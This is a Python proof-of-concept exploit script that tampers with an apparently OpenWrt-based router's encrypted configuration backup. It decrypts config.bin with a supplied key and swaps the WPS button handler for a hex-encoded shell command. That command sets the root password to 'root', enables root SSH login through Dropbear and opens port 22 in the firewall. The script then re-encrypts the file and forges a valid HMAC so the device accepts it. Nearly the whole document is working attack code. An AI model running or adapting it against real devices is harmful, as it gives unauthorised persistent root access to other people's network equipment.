# poc config injection exploit

from Crypto.Cipher import AES
import hmac
import hashlib

try:
	inputkey = open ("proc-rip-0108", "rb")
except:
	print ("Cannot open encryption key")
	exit()

try:
	inputfile = open ("config.bin", "rb")
except:
	print ("Cannot open file config.bin")
	exit()

payload = "736564202d6920275c272773232f726f6f743a2e2a24232f726f6f743a2f62696e2f61736823275c2727202f6574632f706173737764202626206563686f20726f6f743a726f6f74207c20636870617373776420262620736564202d69202d6520275c2727732f232f2f275c2727202d6520275c2727732361736b636f6e736f6c653a2e2a242361736b636f6e736f6c653a2f62696e2f61736823275c2727202f6574632f696e69747461622026262028756369202d712064656c6574652064726f70626561722e616667207c7c20747275652920262620756369206164642064726f70626561722064726f7062656172202626207563692072656e616d652064726f70626561722e4064726f70626561725b2d315d3d61666720262620756369207365742064726f70626561722e6166672e656e61626c653d275c272731275c272720262620756369207365742064726f70626561722e6166672e496e746572666163653d275c27276c616e275c272720262620756369207365742064726f70626561722e6166672e506f72743d275c27273232275c272720262620756369207365742064726f70626561722e6166672e49646c6554696d656f75743d275c2727363030275c272720262620756369207365742064726f70626561722e6166672e50617373776f7264417574683d275c27276f6e275c272720262620756369207365742064726f70626561722e6166672e526f6f7450617373776f7264417574683d275c27276f6e275c272720262620756369207365742064726f70626561722e6166672e526f6f744c6f67696e3d275c272731275c27272026262075636920636f6d6d69742064726f7062656172202626202f6574632f696e69742e642f64726f706265617220656e61626c65202626202f6574632f696e69742e642f64726f706265617220726573746172742026262028756369202d71207365742024287563692073686f77206669726577616c6c207c2067726570202d6d2031202428667733202d71207072696e74207c20656772657020275c272769707461626c6573202d742066696c746572202d41207a6f6e655f6c616e5f696e707574202d7020746370202d6d20746370202d2d64706f7274203232202d6d20636f6d6d656e74202d2d636f6d6d656e742022216677333a202e2b22202d6a2044524f50275c2727207c20736564202d6e202d6520275c2727732f5e69707461626c65732e5c2b6677333a205c282e5c2b5c29222e5c2b2f5c312f70275c272729207c20736564202d6e202d652022732f5c282e5c2b5c292e6e616d653d275c27272e5c2b275c2727242f5c312f7022292e7461726765743d275c2727414343455054275c2727207c7c2074727565292026262075636920636f6d6d6974206669726577616c6c202626202f6574632f696e69742e642f6669726577616c6c2072656c6f6164202626207563692073657420627574746f6e2e7770732e68616e646c65723d275c27277770735f627574746f6e5f707265737365642e7368275c27272026262075636920636f6d6d69740a"

hmac_key = inputkey.read()
aes_key = hmac_key[:32]

config = inputfile.read()

sz = len(config)
header_end = config.find(b"\n\n") + 2
header_data = config[:header_end]
iv_end = header_end + 16
aes_end = sz - 20
iv = config[header_end:iv_end]
aes_data = config[iv_end:aes_end]
hmac_data = config[aes_end:]

print ("File size: " + str(sz))
print ("IV " + str(len(iv)) + " " + iv.hex())
print ("HMAC " + str(len(hmac_data)) + " " + hmac_data.hex())
print ("AES data " + str(len(aes_data)))

# decrypt
cipher_dec = AES.new (aes_key, AES.MODE_CBC, iv)
decrypted_raw = cipher_dec.decrypt (aes_data)

# remove padding
decrypted = decrypted_raw[:-decrypted_raw[-1]]
# patch
patched = decrypted.replace (b"wps_button_pressed.sh", bytes.fromhex(payload))
# add padding
patched_len = len(patched) % 16
if patched_len:
	add_pad = 16 - patched_len
	pad = add_pad * chr(add_pad)
	patched += bytes(pad, "utf-8")

# encrypt
cipher_enc = AES.new (aes_key, AES.MODE_CBC, iv)
encrypted = cipher_enc.encrypt (patched)

# calc new hmac
hmac_new = hmac.new(hmac_key, header_data + iv + encrypted, digestmod=hashlib.sha1).digest()

out = open ("config_patched.bin", "wb")
out.write(header_data)
out.write(iv)
out.write(encrypted)
out.write(hmac_new)
out.close()

print ("Written config_patched.bin")

